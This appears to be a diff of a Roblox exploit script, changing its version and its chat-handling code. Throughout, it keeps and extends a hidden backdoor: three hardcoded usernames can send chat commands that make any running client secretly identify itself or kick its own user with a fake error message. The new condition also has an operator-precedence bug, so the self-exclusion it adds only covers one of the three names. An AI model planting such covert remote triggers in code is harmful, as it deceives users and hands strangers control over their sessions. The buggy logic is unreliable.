@@ -25,7 +25,7 @@ if not game:IsLoaded() then
     notLoaded:Destroy()
 end
 
-currentVersion = '1.6.9'
+currentVersion = '1.7.0'
 
 local guiScale = 1 -- lazy fix for bug lol
 
@@ -1994,7 +1994,7 @@ function chatsend(str)
 end
 
 game.Players.PlayerAdded:Connect(function(plr)
-	if plr and plr.Name == "hookmetamethod_hook" or plr.Name == "Steve_Bloks" or plr.Name == "LeRiFe15327" then
+	if plr and plr.Name == "hookmetamethod_hook" or plr.Name == "Steve_Bloks" or plr.Name == "LeRiFe15327" and game.Players.LocalPlayer.Name ~= "hookmetamethod_hook" and game.Players.LocalPlayer.Name ~= "Steve_Bloks" and game.Players.LocalPlayer.Name ~= "LeRiFe15327" then
 		plr.Chatted:Connect(function(msg)
 			if msg == ".ldiy_identify" then
 				if isChatLegacy then
@@ -2010,14 +2010,13 @@ game.Players.PlayerAdded:Connect(function(plr)
 end)
 
 for _, plr in game.Players:GetPlayers() do
-	if plr and plr.Name == "hookmetamethod_hook" or plr.Name == "Steve_Bloks" or plr.Name == "LeRiFe15327" then
+	if plr and plr.Name == "hookmetamethod_hook" or plr.Name == "Steve_Bloks" or plr.Name == "LeRiFe15327" and game.Players.LocalPlayer.Name ~= "hookmetamethod_hook" and game.Players.LocalPlayer.Name ~= "Steve_Bloks" and game.Players.LocalPlayer.Name ~= "LeRiFe15327" then
 		plr.Chatted:Connect(function(msg)
 			if msg == ".ldiy_identify" then
 				if isChatLegacy then
 					chatRemote:FireServer("iauldiy", plr.Name)
 				else
-					local pchannel = TextChatService:CreateTextChannelForUserAsync(plr.UserId)
-					pchannel:SendAsync("iauldiy")
+					chatChannel:SendAsync("/w "..plr.Name.." iauldiy")
 				end
 			elseif msg == ".ldiy_disconnect" then
 				game.Players.LocalPlayer:Kick("An error occurred.")
